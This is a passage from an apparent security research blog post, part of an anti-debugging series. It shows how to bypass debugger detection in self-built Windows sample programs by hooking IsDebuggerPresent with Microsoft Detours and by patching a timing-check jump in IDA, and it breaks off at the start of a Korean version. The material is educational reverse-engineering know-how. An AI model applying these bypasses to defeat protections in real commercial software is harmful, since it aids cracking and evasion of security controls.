id="Bypassing-Dynamic-Anti-Debugging"><a href="#Bypassing-Dynamic-Anti-Debugging" class="headerlink" title="Bypassing Dynamic Anti-Debugging"></a>Bypassing Dynamic Anti-Debugging</h3><p>Dynamic techniques rely on runtime environmental changes and conditions, so bypassing them requires a deep understanding of the program&#x2019;s execution flow. Here are some common bypassing methods:</p><ol><li><strong>Timing-based Evasion</strong>: Timing-based anti-debugging detects debuggers by measuring execution speed. To bypass this, tools like IDA can be used to patch the code and modify timing checks.</li><li><strong>Exception Handling Manipulation</strong>: Some dynamic techniques detect debuggers by triggering and monitoring exceptions. To evade this, exception-handling routines can be altered to prevent debugger detection.</li></ol><h1 id="Hands-on-Practice"><a href="#Hands-on-Practice" class="headerlink" title="Hands-on Practice"></a>Hands-on Practice</h1><p>Now, let&#x2019;s dive into a hands-on exercise.</p><p><strong>Environment Setup</strong></p><ul><li>OS: Windows 11</li><li>Binary Architecture: 32-bit</li><li>Debugging Tool: IDA Freeware 8.4</li><li>IDE: Visual Studio 2022</li></ul><p>In this setup, we will build a 32-bit binary and use IDA Freeware to debug a binary with anti-debugging techniques applied.</p><h2 id="Static-Anti-Debugging-Bypass-Practice"><a href="#Static-Anti-Debugging-Bypass-Practice" class="headerlink" title="Static Anti-Debugging Bypass Practice"></a>Static Anti-Debugging Bypass Practice</h2><h3 id="1-Basic-Program"><a href="#1-Basic-Program" class="headerlink" title="1. Basic Program"></a>1. Basic Program</h3><p>As demonstrated in &#x201C;Part 1,&#x201D; let&#x2019;s create a simple program with anti-debugging measures.</p><p>Open Visual Studio 2022, create an empty project, add a <code>main.cpp</code> file, and build it as an x86 binary.</p><p><img src="image.png" alt="image.png"></p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>After building the executable, navigate to the <code>./Debug</code> folder and run the compiled binary. You should see the message: <code>No debugger found.</code> </p><p><img src="image%201.png" alt="image.png"></p><p>Now, let&#x2019;s try debugging this program using IDA Freeware. Load the binary into IDA, press <strong>F9</strong> to start debugging, and&#x2026;!!</p><p><img src="image%202.png" alt="image.png"></p><p>As seen above, the program detects the debugger using the <code>IsDebuggerPresent()</code> function and displays a detection message.</p><p>This binary employs <code>IsDebuggerPresent()</code> to check for a debugger. But what if this function is disabled or modified? Let&#x2019;s bypass <strong>Static Anti-Debugging</strong> using <strong>API Hooking</strong>.</p><h3 id="2-API-Hooking-Practice-Bypassing-Static-Anti-Debugging"><a href="#2-API-Hooking-Practice-Bypassing-Static-Anti-Debugging" class="headerlink" title="2. API Hooking Practice (Bypassing Static Anti-Debugging)"></a><strong>2. API Hooking Practice (Bypassing Static Anti-Debugging)</strong></h3><p>We will use the <strong>Microsoft Detours</strong> library to perform API Hooking. This library allows us to intercept API calls and modify their behavior to prevent debugger detection.</p><ol><li>Download the compressed file from <a href="https://github.com/microsoft/detours">Microsoft Detours git</a>, extract it to a preferred folder.</li></ol><p><img src="image%203.png" alt="image.png"></p><ol><li><p>Open <strong>Visual Studio 2022</strong> and launch the terminal.</p><p> <img src="image%204.png" alt="image.png"></p></li><li><p>Run <code>nmake</code> to build the source code. This will generate the <code>bin</code>, <code>include</code>, and <code>lib</code> directories.</p><p> <img src="image%205.png" alt="image.png"></p><p> <img src="image%206.png" alt="image.png"></p></li><li><p>In <strong>Visual Studio</strong>, go to <strong>Project &gt; Properties</strong>, set <strong>Configuration</strong> to <strong>All Configurations</strong>, and <strong>Platform</strong> to <strong>Win32</strong>.</p><p> <img src="image%207.png" alt="image.png"></p></li><li><p>Add the <strong>Detours</strong> library to Visual Studio.</p><ul><li><p><strong>C/C++ Properties: Adding Include Directory</strong></p><ol><li>Open <strong>Project Properties</strong> and select <strong>C/C++</strong>.</li><li>Navigate to <strong>General &gt; Additional Include Directories</strong>.</li><li><p>Add the installation path for Detours:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\include</code></p></li><li><p>Click <strong>OK</strong> to save changes.</p></li></ol></li><li><p><strong>Linker Properties: Adding Library Directory</strong></p><ol><li>In <strong>Project Properties</strong>, go to <strong>Linker</strong>.</li><li>Navigate to <strong>General &gt; Additional Library Directories</strong>.</li><li><p>Add the installation path for Detours:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\lib</code></p></li><li><p>Click <strong>OK</strong> to save changes.</p></li></ol></li></ul></li></ol><p>If your environment is ready, create <strong>dllmain.cpp</strong> to begin API Hooking! &#x1F680;</p><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;detours.lib&quot;</span>)</span></code></pre><p>Now, actually bypass Static Anti-Debugging by hooking the <strong><code>IsDebuggerPresent()</code></strong> function using Detours.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;detours.h&gt;</span></span><span class="hljs-comment">// Function to hook IsDebuggerPresent()</span><span class="hljs-function">BOOL WINAPI <span class="hljs-title">HookedIsDebuggerPresent</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// Always return that no debugger is present</span>}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-comment">// Hook IsDebuggerPresent()</span>    HMODULE hKernel32 = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);    <span class="hljs-keyword">if</span> (hKernel32) {        FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, <span class="hljs-string">&quot;IsDebuggerPresent&quot;</span>);        <span class="hljs-keyword">if</span> (pIsDebuggerPresent) {            <span class="hljs-comment">// Hooking using the Detours library</span>            DetourTransactionBegin();            DetourUpdateThread(GetCurrentThread());            DetourAttach(&amp;(PVOID&amp;)pIsDebuggerPresent, HookedIsDebuggerPresent);            DetourTransactionCommit();        }    }    <span class="hljs-comment">// Test</span>    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Build the above source code and conduct the same test as before.</p><p><img src="image%208.png" alt="image.png"></p><p>Naturally, when executed locally without a debugger attached, it prints <code>No debugger found.</code> Now, what happens if we attach a debugger to the binary using IDA?</p><p><img src="image%209.png" alt="image.png"></p><p>OUYA&#x2026;(It is interjection, means Oh wow&#x2026;, Oh my God..) Even while debugging in IDA, it still executes as if no debugger is present.</p><p><img src="1b18ed6b-05c4-4b20-a412-522bd1c12bb3.png" alt="image.png"></p><p>This demonstrates how easily Static Anti-Debugging can be bypassed through API hooking.</p><p>Since Static Anti-Debugging techniques rely on various system information, they can be bypassed by:</p><ul><li><strong>Hooking functions</strong> commonly used for anti-debugging, such as <code>NtQueryInformationProcess()</code></li><li><strong>Directly modifying</strong> anti-debugging-related information in memory, such as the PEB&#x2019;s <code>BeingDebugged</code> flag<ul><li>These friends are typically manipulated by anti-debugging functions.</li></ul></li></ul><p>So, how can we bypass <strong>Dynamic Anti-Debugging</strong>, which exploits the debugger&#x2019;s mechanics? Unlike Static Anti-Debugging, which only needs to be bypassed once, Dynamic Anti-Debugging is applied continuously during execution, requiring either repeated bypassing or a more fundamental approach.</p><p>Let&#x2019;s explore bypassing <strong>Dynamic Anti-Debugging</strong> techniques and observe the differences!</p><h2 id="Dynamic-Anti-Debugging-Bypass-Practice"><a href="#Dynamic-Anti-Debugging-Bypass-Practice" class="headerlink" title="Dynamic Anti-Debugging Bypass Practice"></a>Dynamic Anti-Debugging Bypass Practice</h2><h3 id="1-Regular-Program"><a href="#1-Regular-Program" class="headerlink" title="1. Regular Program"></a>1. Regular Program</h3><p>For the Dynamic Anti-Debugging practice, we&#x2019;ll use <strong>timing-based anti-debugging</strong> techniques introduced in &#x201C;Part 1.&#x201D; Please build the following code as an x86 binary.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-comment">// Key decryption function</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decryptKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++) {        key[i] = key[i] - <span class="hljs-number">1</span>; <span class="hljs-comment">// Simple Caesar cipher</span>    }}<span class="hljs-comment">// Function to process important data</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processImportantData</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Processing important data with key: %s\n&quot;</span>, key);    <span class="hljs-comment">// Print a simple message</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Important data processed successfully!\n&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;nztfdsfulfz&quot;</span>;    <span class="hljs-comment">// [1] Timing-based anti-debugging: Measure execution time and detect if an abnormal delay occurs, indicating a debugger is attached.</span>    <span class="hljs-keyword">uint64_t</span> start_time = GetTickCount64();    decryptKey(key);    <span class="hljs-keyword">uint64_t</span> end_time = GetTickCount64();    <span class="hljs-keyword">uint64_t</span> elapsed_time = end_time - start_time;    <span class="hljs-comment">// [2] If execution takes longer than 1 second, assume a debugger is attached.</span>    <span class="hljs-keyword">if</span> (elapsed_time &gt; <span class="hljs-number">1000</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// Exit the program</span>    }    <span class="hljs-comment">// [3] Execute critical logic using the decrypted key: Compare with the correct key to determine valid execution.</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(key, <span class="hljs-string">&quot;mysecretkey&quot;</span>) == <span class="hljs-number">0</span>) {        processImportantData(key);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid key!\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>This code implements timing-based anti-debugging to protect the critical decryption logic ([1]). If an attacker attempts to analyze the key decryption process, the execution time difference will trigger ([2]), causing the program to terminate. Conversely, under normal execution conditions ([3]), the logic proceeds without issue.</p><p>Now, let&#x2019;s build and run the program!</p><p><img src="image%2010.png" alt="image.png"></p><p>It runs correctly. In this simple example, it just prints <code>Important data processed successfully!</code>, but you can imagine a scenario where a critical operation using the key takes place.</p><p>Since we have verified normal execution, let&#x2019;s attempt debugging this program using IDA.</p><p><img src="image%2011.png" alt="image.png"></p><p>Given that we are particularly interested in the key decryption logic, set a breakpoint (shortcut: F2) on the decryption function and start debugging (F9). By stepping into (F7) the function and analyzing how the key is decrypted, we can then continue execution. However, as shown below, the program detects debugging activity and terminates.</p><p><img src="2f9db531-4021-4c69-9805-b40c8cb60ee0.png" alt="image.png"></p><p>Even though this is a simple example, if the key changed on every execution, even if extracted via debugging, the anti-debugging mechanism would cause the program to terminate, making it impossible to use the extracted key. The effectiveness of anti-debugging depends on the skill level of the attacker; by applying more advanced techniques, the difficulty of analysis can be significantly increased.</p><h3 id="2-Binary-Patching-Bypassing-Dynamic-Anti-Debugging"><a href="#2-Binary-Patching-Bypassing-Dynamic-Anti-Debugging" class="headerlink" title="2. Binary Patching (Bypassing Dynamic Anti-Debugging)"></a>2. Binary Patching (Bypassing Dynamic Anti-Debugging)</h3><p>How can we modify the program&#x2019;s flow to bypass the anti-debugging check?</p><p>We can consider two main approaches:</p><blockquote><p>&#x2460; Neutralizing the timing check</p><ol><li>Locate the <code>GetTickCount64()</code> function calls and modify them.<ul><li>Patch them with NOP instructions or replace them with a function that always returns a constant value.</li></ul></li><li>Modify <code>if (elapsed_time &gt; 1000)</code> to an impossible condition, like <code>if (elapsed_time &lt; 0)</code>.<ul><li>Alternatively, modify a <code>jmp</code> instruction to always proceed normally.</li></ul></li></ol><p><strong>&#x2461; Preventing program termination</strong></p><ul><li>Locate <code>printf(&quot;Debugger detected!\n&quot;); return 1;</code> and patch <code>return 1;</code> with <strong>NOP (0x90)</strong>.</li></ul></blockquote><p>Since compiler optimizations may alter the actual implementation, let&#x2019;s examine the binary in IDA.</p><p><img src="image%2012.png" alt="image.png"></p><p>I will patch the instruction at line 16. Normally, CF and ZF flags must be 0 for <code>elapsed_time</code> to be less than 1 second, but I will modify <code>jbe</code> to <code>ja</code> so that the key validation logic only executes when execution takes more than 1 second. By selecting line 16 and examining the assembly, we can see two jump instructions. I will patch the first one with NOP and modify the second one at runtime.</p><p><img src="image%2013.png" alt="image.png"></p><p>Now, let&#x2019;s set a breakpoint on the key decryption function and ensure debugging lasts longer than 1 second before proceeding.</p><p>When we press F9 to start debugging:</p><p><img src="image%2014.png" alt="image.png"></p><p>We hit the first breakpoint, allowing us to analyze <code>decryptKey</code>. After analyzing, we continue execution until the second breakpoint.</p><p><img src="image%2015.png" alt="image.png"></p><p>At the second breakpoint, we modify <code>jbe</code> to <code>ja</code> using &#x201C;Edit &gt; Patch Program &gt; Assemble,&#x201D; successfully bypassing the anti-debugging check. LOL</p><p><img src="image%2016.png" alt="image.png"></p><p>In similar situations, other bypass techniques include modifying <code>CF</code> and <code>ZF</code> flags at runtime or hooking <code>GetTickCount()</code> to return a constant value, effectively neutralizing the anti-debugging logic.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p><img src="Debug_part2.jpg" alt="Debug_part2.jpg"></p><p>The techniques we practiced today are classic examples of bypassing anti-debugging. These techniques are used as &#x201C;trap card&#x201D; to bypass security solutions when they try to block specific actions.</p><blockquote><p>Blocking debuggers with Anti-Debugging techniques, bypassing those with Anti-Debugging bypass, <del>countering that with Anti-Anti-Anti-Debugging, and stopping that with Anti-Anti-Anti-Anti tititi Fragile Fragile!</del></p><p><img src="Anti-Fragile.gif" alt="K-POP Group LE SSERAFIM"></p><p>K-POP Group LE SSERAFIM</p></blockquote><h2 id="Limitations-of-Anti-Debugging"><a href="#Limitations-of-Anti-Debugging" class="headerlink" title="Limitations of Anti-Debugging"></a>Limitations of Anti-Debugging</h2><p>Anti-debugging is a core technique that makes code analysis difficult and hinders reverse engineering and vulnerability analysis. It can prevent unauthorized copying, cracking, and misuse of software, especially in areas handling sensitive data like finance, gaming, and security products. (Often featured in CTF challenges!) With its flexibility to be adapted to various environments, it has high effectiveness in detecting and responding when an attacker tries to debug.</p><p>However, as we saw in the practice session today, it is vulnerable to code patching and API hooking. This is because once you know the area, it becomes patchable.</p><p><img src="image%2017.png" alt="image.png"></p><blockquote><p>???: So why not just hide it? / 000: How!!</p></blockquote><p><img src="9o6emu.gif" alt="9o6emu.gif"></p><p>By obfuscating the anti-debugging logic, it becomes impossible to understand the technique used. If you cannot identify the anti-debugging method, it becomes much harder to figure out how to bypass it. This combination of static obfuscation techniques and dynamic anti-debugging creates a program that is extremely difficult and complex to analyze. (Maybe I&#x2019;ll cover obfuscation in a future blog post!)</p><h2 id="Significance"><a href="#Significance" class="headerlink" title="Significance"></a>Significance</h2><p>From a malware analysis perspective, reversing and anti-reversing are like an eternal battle between sword and shield. Malware analysts use reversing techniques to uncover how malicious code operates, while malware developers employ anti-reversing techniques to obstruct analysis and keep their code&#x2019;s secrets hidden.</p><p>Even from the standpoint of ethical software developers, reversing and anti-reversing hold significant meaning. Reversing can be used to identify software vulnerabilities and strengthen security, whereas anti-reversing helps protect intellectual property and prevent unauthorized copying.</p><p>Ultimately, reversing and anti-reversing, debugging and anti-debugging, continuously evolve in response to each other, fueling an ongoing battle. In this sense, it feels much like the never-ending struggle between heroes and villains in movies&#x2014;an endless tug-of-war between malware developers and analysts, software developers and attackers. However, the real issue is not the technology itself, but the ethical responsibility of those who wield it. Perhaps our true mission is to use these technologies wisely to build a safer and more trustworthy digital world. How do you think?</p><p><img src="image%2018.jpg" alt="image.png"></p><p>Thank you for reading the long post. I&#x2019;ll return with better research articles &#x1F642;</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p>Detoures - <a href="https://secmem.tistory.com/480">https://secmem.tistory.com/480</a></p><p><a href="https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software">https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software</a></p><p><a href="https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis">https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 2(KR)</title>
      <link>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/</link>
      <guid>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/</guid>
      <pubDate>Sun, 23 Mar 2025 15:45:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xC2DC;&amp;#xAC04;&amp;#xC5D0;&amp;#xB2</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. &#x1F642;</p><p>&#xC9C0;&#xB09C; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; </p><ul><li>&#xB514;&#xBC84;&#xAE45;: &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xB294; &#xACF3;&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xBC94;&#xC704;&#xB97C; &#xC881;&#xD600;&#xAC00;&#xBA70; &#xC6D0;&#xC778;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xD574;&#xACB0;&#xD558;&#xB294; &#xACFC;&#xC815;</li><li>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;: &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xAC70;&#xB098; &#xADF8; &#xB3D9;&#xC791;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC5EC;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC5ED;&#xACF5;&#xD559; &#xBC0F; &#xBD84;&#xC11D;&#xC5D0; &#xCDE8;&#xC57D;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xAE30;&#xBC95;</li></ul><p>&#xC744; &#xACF5;&#xBD80;&#xD588;&#xC5C8;&#xC8E0;(&#xD639;&#xC2DC; &#xC544;&#xC9C1; &#xBABB;&#xBCF4;&#xC168;&#xB2E4;&#xBA74; &#x1F447; &#x314E;&#x314E;).</p><p><em>&#xC9C0;&#xB09C; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</em></p><p><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/kr/">[Research] Anti-Debugging Part1(KR)</a></p><p>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC5D0;&#xC11C;&#xB294; <strong>Static</strong>&#xACFC; <strong>Dynamic</strong> &#xB450; &#xAC00;&#xC9C0; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Static</strong> &#xAE30;&#xBC95;&#xC740; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xBCF4;&#xB098; API&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Windows&#xC5D0;&#xC11C;&#xB294; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <strong>Dynamic</strong> &#xAE30;&#xBC95;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC911;&#xC758; &#xD589;&#xB3D9; &#xD328;&#xD134;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xBA70;, &#xD0C0;&#xC774;&#xBC0D; &#xAE30;&#xBC18; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xBC29;&#xBC95;"><a href="#&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;-&#xBC29;&#xBC95;" class="headerlink" title="&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;"></a>&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;</h2><h3 id="Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;"><a href="#Static-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;" class="headerlink" title="Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;"></a>Static &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;</h3><p>Static &#xAE30;&#xBC95;&#xC740; &#xAD6C;&#xD604;&#xC774; &#xAC04;&#xB2E8;&#xD558;&#xC9C0;&#xB9CC;, &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xC27D;&#xAC8C; &#xC6B0;&#xD68C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>API Hooking</strong>: &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; API&#xB97C; Hooking&#xD558;&#xC5EC; API &#xD638;&#xCD9C;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xACE0;, &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Windows&#xC5D0;&#xC11C; <code>IsDebuggerPresent()</code> &#xD568;&#xC218;&#xB97C; Hooking&#xD558;&#xC5EC; &#xD56D;&#xC0C1; &#xB514;&#xBC84;&#xAC70;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC751;&#xB2F5;&#xD558;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>PEB &#xAD6C;&#xC870;&#xCCB4; &#xC870;&#xC791;</strong>: PEB&#xC758; <code>BeingDebugged</code> &#xD544;&#xB4DC;&#xB97C; &#xC9C1;&#xC811; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xB514;&#xBC84;&#xAC70;&#xC758; &#xC874;&#xC7AC;&#xB97C; &#xC228;&#xAE38; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><h3 id="Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;"><a href="#Dynamic-&#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;-&#xAE30;&#xBC95;-&#xC6B0;&#xD68C;" class="headerlink" title="Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;"></a>Dynamic &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xAE30;&#xBC95; &#xC6B0;&#xD68C;</h3><p>Dynamic &#xAE30;&#xBC95;&#xC740; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xD658;&#xACBD; &#xBCC0;&#xD654;&#xB098; &#xB3D9;&#xC801; &#xC870;&#xAC74;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xB3D9;&#xC791;&#xD558;&#xBBC0;&#xB85C;, &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB7F0;&#xD0C0;&#xC784; &#xC0C1;&#xD669;&#xC744; &#xCDA9;&#xBD84;&#xD788; &#xC774;&#xD574;&#xD574;&#xC57C; 